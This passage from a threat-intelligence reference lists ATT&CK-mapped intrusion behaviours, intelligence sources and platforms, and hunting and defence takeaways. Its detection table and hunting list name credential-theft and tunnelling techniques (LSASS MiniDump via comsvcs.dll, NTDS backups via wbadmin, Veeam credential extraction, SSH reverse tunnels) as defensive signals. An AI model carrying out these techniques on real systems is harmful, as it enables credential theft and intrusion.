| Domain Admin group additions | T1098 | Persistence via privileged accounts |
| Scheduled tasks with LSASS-like names | T1053.005 | Masquerading persistence |
| Veeam backup deletion / credential extraction | T1490/T1555 | Pre-ransomware preparation |
| SSH reverse tunnels | T1572 | C2 tunneling |
| MSI sideloading via consent.exe | T1574.002 | Loader execution |
| Enterprise Admin group membership changes | T1098 | Highest privilege persistence |

---

## 9. Key Threat Intelligence Sources & Platforms

### 9.1 Vendor Threat Research Blogs (Primary Sources)

| Source | Focus | URL |
|--------|-------|-----|
| The DFIR Report | Real-world intrusion analysis with full attack chains | thedfirreport.com |
| Google/Mandiant (Threat Intelligence) | APT tracking, zero-days, malware analysis | cloud.google.com/blog/topics/threat-intelligence/ |
| Cisco Talos | Vulnerability research, threat campaigns, Snort rules | blog.talosintelligence.com |
| Microsoft Security Blog | Nation-state tracking (Blizzard/Typhoon taxonomy) | microsoft.com/en-us/security/blog/ |
| Unit 42 (Palo Alto) | APT research, ransomware, malware families | unit42.paloaltonetworks.com |
| Check Point Research | Malware analysis, vulnerability disclosure, threat stats | research.checkpoint.com |
| CrowdStrike Blog | Threat actor tracking (animal taxonomy) | crowdstrike.com/blog/ |
| Recorded Future Blog | Geopolitical CTI, dark web intelligence | recordedfuture.com/blog |
| Group-IB Blog | Financial fraud, dark web, supply chain attacks | group-ib.com/blog/ |
| Proofpoint Blog | Email threats, phishing, social engineering | proofpoint.com/us/blog |

### 9.2 Tracking & Reference Platforms

| Platform | Purpose |
|----------|---------|
| MITRE ATT&CK | Adversary behavior knowledge base (176 groups) |
| RansomLook | Ransomware group tracking (549 groups, 731 DLS) |
| CISA KEV | Known exploited vulnerabilities (1,542 CVEs) |
| Malpedia | Malware identification and context |
| VirusTotal | Sample analysis and IOC enrichment |
| Shodan/Censys | Internet-facing asset discovery |
| abuse.ch ecosystem | Malware samples, URLs, botnet tracking |

### 9.3 Key Reference Documents
- **NIST SP 800-150**: Guide to Cyber Threat Information Sharing
- **Diamond Model Paper**: Intrusion analysis methodology (Caltagirone, Pendergast, Betz)
- **CIA Tradecraft Primer**: Structured analytic techniques
- **Pyramid of Pain**: Indicator value framework (Bianco)
- **ENISA TIP Evaluation Guide**: Threat intelligence platform assessment
- **Intel 471 GIR Handbook**: Cybercrime Underground General Intelligence Requirements
- **Recorded Future Intelligence Handbook**: CTI program methodology
- **CREST CTI Maturity Model**: Program maturity assessment tool

---

## 10. Operational Takeaways

### For Defenders
1. **Prioritize TTP detection over IOC matching** — IOCs are ephemeral; behaviors persist
2. **Monitor for RMM tool abuse** — AnyDesk, RustDesk, ScreenConnect are the new persistence
3. **Protect credential stores** — LSASS, NTDS.dit, Veeam, unattend.xml are all targets
4. **Watch for renamed tools** — Rclone as sihosts.exe, Advanced IP Scanner as random names
5. **Backup deletion is the ransomware canary** — Veeam job deletion precedes encryption
6. **Initial access brokers mean long dwell times** — 56-day Lunar Spider case had no ransomware but full compromise
7. **Bulletproof hosting IPs are high-confidence indicators** — Railnet/Virtualine, PQ Hosting
8. **Search engine malvertising is a growing vector** — Bing/Google ads delivering trojanized installers

### For Threat Hunters
1. Hunt for DGA domain resolution patterns
2. Look for wbadmin NTDS backup commands
3. Search for comsvcs.dll MiniDump calls
4. Correlate AnyDesk/RustDesk installation with non-IT-approved sources
5. Monitor Enterprise Admin and Domain Admin group membership changes
6. Hunt for SSH reverse tunnels from internal hosts
7. Track Rclone configuration files and renamed binaries
8. Watch for NetExec/nxc.exe and AdFind execution

### For CTI Teams
1. **Establish PIRs** aligned to your organization's threat profile
2. **Deploy a TIP** (MISP or OpenCTI minimum) for feed aggregation
3. **Automate IOC ingestion** via STIX/TAXII from CISA AIS and abuse.ch
4. **Map your detection coverage** against ATT&CK using Navigator
5. **Track ransomware ecosystem evolution** — groups merge, rebrand, share infrastructure
6. **Monitor IAB activity** — Lunar Spider, Exotic Lily, and others are upstream of ransomware
7. **Produce intelligence at all three levels** — strategic, operational, tactical
8. **Participate in sharing communities** — ISACs, MISP instances, FIRST
